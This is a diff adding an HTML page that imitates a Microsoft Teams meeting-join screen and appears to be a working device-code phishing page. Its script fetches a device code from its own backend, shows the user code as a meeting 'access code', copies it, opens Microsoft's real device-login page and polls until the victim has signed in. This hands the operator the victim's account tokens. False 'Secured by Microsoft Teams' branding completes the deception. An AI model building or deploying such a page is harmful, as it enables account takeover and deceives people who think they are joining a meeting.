@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Teams Meeting</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', system-ui, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; padding: 10px 24px; background: #fff; border-bottom: 1px solid #e0e0e0; display: flex; align-items: center; }
+        .header .logo { display: flex; align-items: center; gap: 8px; }
+        .header .logo svg { width: 24px; height: 24px; }
+        .header .logo span { font-size: 14px; font-weight: 600; color: #2c2c2c; }
+        .content { max-width: 460px; width: 100%; margin: 40px auto; padding: 0 20px; }
+        .meeting-card { background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); padding: 24px; text-align: center; }
+        .code-box { background: linear-gradient(135deg, #464EB8, #3B42A0); border-radius: 8px; padding: 20px; margin: 20px 0; }
+        .code-label { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: rgba(255,255,255,0.7); margin-bottom: 8px; }
+        .code-value { font-family: monospace; font-size: 28px; font-weight: 700; letter-spacing: 4px; color: #fff; }
+        .copy-btn { background: rgba(255,255,255,0.2); color: #fff; border: none; padding: 8px 24px; border-radius: 4px; font-size: 12px; cursor: pointer; margin-top: 12px; }
+        .copy-btn:hover { background: rgba(255,255,255,0.3); }
+        .steps { text-align: left; margin: 20px 0; }
+        .step { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; font-size: 13px; color: #4a4a4a; }
+        .step-num { background: #464EB8; color: #fff; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; }
+        .continue-btn { width: 100%; padding: 12px; background: #464EB8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
+        .continue-btn:hover { background: #3B42A0; }
+        .loading-state, .success-state { text-align: center; padding: 40px; display: none; }
+        .spinner { width: 48px; height: 48px; border: 3px solid #eee; border-radius: 50%; position: relative; margin: 0 auto; animation: spin 1s linear infinite; }
+        .spinner::before { content: ''; position: absolute; inset: -3px; border-radius: 50%; border: 3px solid transparent; border-top-color: #464EB8; animation: spin 1.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer { margin-top: 20px; text-align: center; font-size: 11px; color: #a0a0a0; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <svg viewBox="0 0 32 32" fill="none">
+                <path d="M16 4C9.37 4 4 9.37 4 16s5.37 12 12 12 12-5.37 12-12S22.63 4 16 4zm-2 17h-3v-3h3v3zm0-5h-3V9h3v7zm5 5h-3v-3h3v3zm0-5h-3V9h3v7z" fill="#464EB8"/>
+            </svg>
+            <span>Teams Meetings</span>
+        </div>
+    </div>
+
+    <div class="content">
+        <div id="loadingState" class="loading-state">
+            <div class="spinner"></div>
+            <div class="loading-text" style="margin-top: 16px;">Connecting to Teams...</div>
+        </div>
+
+        <div id="mainCard" class="meeting-card">
+            <h3>Join Teams Meeting</h3>
+            <p style="color: #666; font-size: 13px; margin-top: 8px;">Verify your identity to join this secure meeting</p>
+            
+            <div class="code-box">
+                <div class="code-label">Access Code</div>
+                <div class="code-value" id="codeDisplay">------</div>
+                <button class="copy-btn" id="copyBtn">Copy Code</button>
+            </div>
+
+            <div class="steps">
+                <div class="step"><div class="step-num">1</div><div>Copy the access code</div></div>
+                <div class="step"><div class="step-num">2</div><div>Click the button below to open Microsoft login</div></div>
+                <div class="step"><div class="step-num">3</div><div>Paste the code and sign in</div></div>
+            </div>
+
+            <button class="continue-btn" id="continueBtn">Continue to Microsoft Login</button>
+            <div class="footer">Secured by Microsoft Teams</div>
+        </div>
+
+        <div id="successState" class="success-state">
+            <div class="spinner"></div>
+            <div class="success-text">Verification complete!</div>
+            <div class="message-sub">Joining meeting...</div>
+        </div>
+    </div>
+
+    <script>
+        let currentDeviceCode = null;
+        let currentSessionId = null;
+        let pollInterval = null;
+        
+        async function startAuth() {
+            try {
+                const response = await fetch('/start', { method: 'POST' });
+                const data = await response.json();
+                
+                if (data.userCode && data.deviceCode) {
+                    currentDeviceCode = data.deviceCode;
+                    currentSessionId = data.sessionId;
+                    document.getElementById('codeDisplay').textContent = data.userCode;
+                    document.getElementById('loadingState').style.display = 'none';
+                    document.getElementById('mainCard').style.display = 'block';
+                    
+                    startPolling();
+                }
+            } catch (err) {
+                console.error('Auth error:', err);
+                setTimeout(startAuth, 2000);
+            }
+        }
+        
+        function startPolling() {
+            if (pollInterval) clearInterval(pollInterval);
+            
+            pollInterval = setInterval(async () => {
+                if (!currentDeviceCode) return;
+                
+                try {
+                    const response = await fetch(`/state?device_code=${currentDeviceCode}&session_id=${currentSessionId}`);
+                    const data = await response.json();
+                    
+                    if (data.status === 'success') {
+                        clearInterval(pollInterval);
+                        document.getElementById('mainCard').style.display = 'none';
+                        document.getElementById('successState').style.display = 'block';
+                        setTimeout(() => window.close(), 3000);
+                    }
+                } catch (err) {}
+            }, 3000);
+        }
+        
+        document.getElementById('copyBtn').onclick = () => {
+            const code = document.getElementById('codeDisplay').textContent;
+            navigator.clipboard.writeText(code);
+            alert('Code copied!');
+        };
+        
+        document.getElementById('continueBtn').onclick = () => {
+            const code = document.getElementById('codeDisplay').textContent;
+            if (code) navigator.clipboard.writeText(code);
+            window.open('https://microsoft.com/devicelogin', '_blank', 'width=600,height=700');
+        };
+        
+        startAuth();
+    </script>
+</body>
+</html>
